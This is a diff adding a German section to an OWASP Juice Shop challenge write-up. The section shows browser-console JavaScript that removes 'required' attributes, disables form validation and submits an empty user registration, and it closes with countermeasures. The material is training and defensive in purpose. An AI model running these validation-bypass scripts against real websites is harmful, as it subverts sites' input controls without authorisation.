@@ -816,7 +816,307 @@ Die Challenge wird gelöst, sobald eine der identifizierten kryptografischen Sch
 
 ---
 
-## 6. File Upload Bypass - PDF Validation umgehen
+## 6. Empty User Registration - Required Field Bypass
+
+### 📝 Beschreibung
+Diese Challenge verlangt die Registrierung eines Benutzers mit völlig leerer E-Mail und leerem Passwort. Die Anwendung hat Client-seitige Validierung, die durch DOM-Manipulation umgangen werden kann.
+
+### 🎯 Aufgabe
+*"Register a user with an empty email and password."*
+
+### 🔍 Analyse der Registrierungsform
+
+```javascript
+// 1. Inspect der Input-Felder
+document.querySelectorAll('input').forEach((el, i) => 
+    console.log(i, el.type, el.name, el.id)
+);
+
+// Typische Ausgabe:
+// 0 "email" "email" "emailControl"
+// 1 "password" "password" "passwordControl"  
+// 2 "password" "repeatPassword" "repeatPasswordControl"
+```
+
+### 🛠️ Exploit-Methode: Required-Attribute entfernen
+
+```javascript
+// Schritt 1: Entferne Required-Attribute von allen Feldern
+document.querySelector('#emailControl').removeAttribute('required');
+document.querySelector('#passwordControl').removeAttribute('required');
+document.querySelector('#repeatPasswordControl').removeAttribute('required');
+
+// Schritt 2: Setze explizit leere Werte
+document.querySelector('#emailControl').value = '';
+document.querySelector('#passwordControl').value = '';
+document.querySelector('#repeatPasswordControl').value = '';
+
+// Schritt 3: Aktiviere den Submit-Button falls nötig
+const btn = document.querySelector('button[type="submit"]');
+if (btn) {
+    btn.disabled = false;
+    console.log('✅ Submit button enabled');
+}
+```
+
+### 🔍 Alternative Methoden
+
+#### **Methode 1: Attribut-Manipulation**
+
+```javascript
+// Alle Required-Attribute auf einmal entfernen
+document.querySelectorAll('input[required]').forEach(input => {
+    input.removeAttribute('required');
+    input.value = '';
+    console.log(`✅ Cleared: ${input.id}`);
+});
+
+// Form-Validation deaktivieren
+const form = document.querySelector('form');
+if (form) {
+    form.noValidate = true;
+    console.log('✅ Form validation disabled');
+}
+```
+
+#### **Methode 2: Event-Listener Manipulation**
+
+```javascript
+// Registrierung mit Event-Manipulation
+function bypassRegistrationValidation() {
+    console.log('🚀 Bypassing registration validation...');
+    
+    // 1. Finde die Registrierungs-Form
+    const form = document.querySelector('form');
+    const emailInput = document.querySelector('#emailControl');
+    const passwordInput = document.querySelector('#passwordControl');
+    const repeatPasswordInput = document.querySelector('#repeatPasswordControl');
+    
+    if (emailInput && passwordInput && repeatPasswordInput) {
+        // 2. Entferne alle Validierungsattribute
+        [emailInput, passwordInput, repeatPasswordInput].forEach(input => {
+            input.removeAttribute('required');
+            input.removeAttribute('minlength');
+            input.removeAttribute('pattern');
+            input.value = '';
+        });
+        
+        // 3. Deaktiviere Client-seitige Validierung
+        if (form) {
+            form.noValidate = true;
+        }
+        
+        // 4. Simuliere User-Input Events
+        [emailInput, passwordInput, repeatPasswordInput].forEach(input => {
+            input.dispatchEvent(new Event('input', { bubbles: true }));
+            input.dispatchEvent(new Event('change', { bubbles: true }));
+        });
+        
+        // 5. Submit die Form
+        const submitBtn = document.querySelector('button[type="submit"]');
+        if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.click();
+            console.log('✅ Empty registration submitted');
+        }
+    }
+}
+
+// Ausführung
+bypassRegistrationValidation();
+```
+
+#### **Methode 3: Angular-spezifische Manipulation**
+
+```javascript
+// Angular Form-Control Manipulation
+function bypassAngularValidation() {
+    console.log('🎯 Bypassing Angular form validation...');
+    
+    // 1. Finde Angular Form-Controls
+    const controls = ['emailControl', 'passwordControl', 'repeatPasswordControl'];
+    
+    controls.forEach(controlId => {
+        const control = document.getElementById(controlId);
+        if (control) {
+            // Entferne Angular-spezifische Validatoren
+            control.removeAttribute('required');
+            control.removeAttribute('ng-required');
+            control.removeAttribute('data-ng-required');
+            
+            // Setze Wert auf leer
+            control.value = '';
+            
+            // Triggere Angular Events
+            control.dispatchEvent(new Event('input', { bubbles: true }));
+            control.dispatchEvent(new Event('blur', { bubbles: true }));
+            
+            console.log(`✅ Cleared ${controlId}`);
+        }
+    });
+    
+    // 2. Deaktiviere Form-Validation
+    const form = document.querySelector('form');
+    if (form) {
+        form.classList.remove('ng-invalid');
+        form.classList.add('ng-valid');
+        form.noValidate = true;
+    }
+    
+    // 3. Enable Submit Button
+    const submitButton = document.querySelector('button[type="submit"]');
+    if (submitButton) {
+        submitButton.disabled = false;
+        submitButton.click();
+        console.log('✅ Angular validation bypassed');
+    }
+}
+
+// Ausführung
+bypassAngularValidation();
+```
+
+### 🔍 Vollständiger Exploit-Workflow
+
+```javascript
+// Kompletter Workflow für Empty Registration
+async function exploitEmptyRegistration() {
+    console.log('🚀 Starting Empty User Registration Exploit...');
+    
+    try {
+        // 1. Navigiere zur Registrierungsseite
+        if (!window.location.hash.includes('register')) {
+            window.location.hash = '#/register';
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+        
+        // 2. Warte bis Form geladen ist
+        await new Promise(resolve => {
+            const checkForm = () => {
+                if (document.querySelector('#emailControl')) {
+                    resolve();
+                } else {
+                    setTimeout(checkForm, 100);
+                }
+            };
+            checkForm();
+        });
+        
+        // 3. Entferne alle Validierungsconstraints
+        const inputs = ['emailControl', 'passwordControl', 'repeatPasswordControl'];
+        inputs.forEach(inputId => {
+            const input = document.getElementById(inputId);
+            if (input) {
+                // Entferne HTML5 Validierung
+                input.removeAttribute('required');
+                input.removeAttribute('minlength');
+                input.removeAttribute('maxlength');
+                input.removeAttribute('pattern');
+                input.removeAttribute('type'); // Entferne type="email"
+                input.type = 'text'; // Setze auf text
+                
+                // Setze leeren Wert
+                input.value = '';
+                
+                // Triggere Events
+                input.dispatchEvent(new Event('input', { bubbles: true }));
+                input.dispatchEvent(new Event('change', { bubbles: true }));
+                
+                console.log(`✅ Processed ${inputId}`);
+            }
+        });
+        
+        // 4. Deaktiviere Form-Validation
+        const form = document.querySelector('form');
+        if (form) {
+            form.noValidate = true;
+            form.setAttribute('novalidate', 'true');
+        }
+        
+        // 5. Enable und Click Submit Button
+        const submitButton = document.querySelector('button[type="submit"]');
+        if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.removeAttribute('disabled');
+            
+            // Warte kurz und submit
+            setTimeout(() => {
+                submitButton.click();
+                console.log('✅ Empty registration submitted!');
+            }, 500);
+        }
+        
+    } catch (error) {
+        console.error('❌ Error during exploit:', error);
+    }
+}
+
+// Starte den Exploit
+exploitEmptyRegistration();
+```
+
+### 💡 Warum funktioniert dieser Bypass?
+
+1. **Client-seitige Validierung**: Die Überprüfung erfolgt nur im Browser
+2. **HTML5 Constraints**: `required`-Attribute können entfernt werden
+3. **JavaScript Manipulation**: DOM-Änderungen sind möglich
+4. **Angular Framework**: Form-Validierung kann deaktiviert werden
+
+### 🔍 Debugging und Troubleshooting
+
+```javascript
+// Debug-Hilfsfunktionen
+function debugRegistrationForm() {
+    console.log('🔍 Debugging Registration Form...');
+    
+    // 1. Alle Input-Felder analysieren
+    const inputs = document.querySelectorAll('input');
+    console.log(`Found ${inputs.length} input fields:`);
+    
+    inputs.forEach((input, index) => {
+        console.log(`${index}: ${input.type} | ${input.name} | ${input.id} | required: ${input.required}`);
+    });
+    
+    // 2. Form-Status prüfen
+    const form = document.querySelector('form');
+    if (form) {
+        console.log('Form validation state:', {
+            noValidate: form.noValidate,
+            valid: form.checkValidity(),
+            classes: form.className
+        });
+    }
+    
+    // 3. Submit-Button Status
+    const submitBtn = document.querySelector('button[type="submit"]');
+    if (submitBtn) {
+        console.log('Submit button state:', {
+            disabled: submitBtn.disabled,
+            text: submitBtn.textContent.trim()
+        });
+    }
+}
+
+// Ausführen des Debug-Tools
+debugRegistrationForm();
+```
+
+### 🚨 Sicherheitslücke
+
+- **Schwachstelle**: Nur client-seitige Validierung
+- **Impact**: Umgehung von Eingabe-Validierung
+- **CVSS**: Low-Medium (Input Validation Bypass)
+
+### 🛡️ Gegenmaßnahmen
+
+1. **Server-seitige Validierung**: Alle Eingaben auch auf dem Server prüfen
+2. **Doppelte Validierung**: Client + Server Validierung
+3. **Sanitization**: Eingaben bereinigen und validieren
+4. **Rate Limiting**: Schutz vor automatisierten Registrierungen
+
+---
+
+## 7. File Upload Bypass - PDF Validation umgehen
 
 ### 📝 Beschreibung
 Die Juice Shop prüft bei File Uploads nur die Dateiendung, nicht den tatsächlichen Inhalt. Dies ermöglicht das Hochladen von beliebigen Dateien als PDFs.
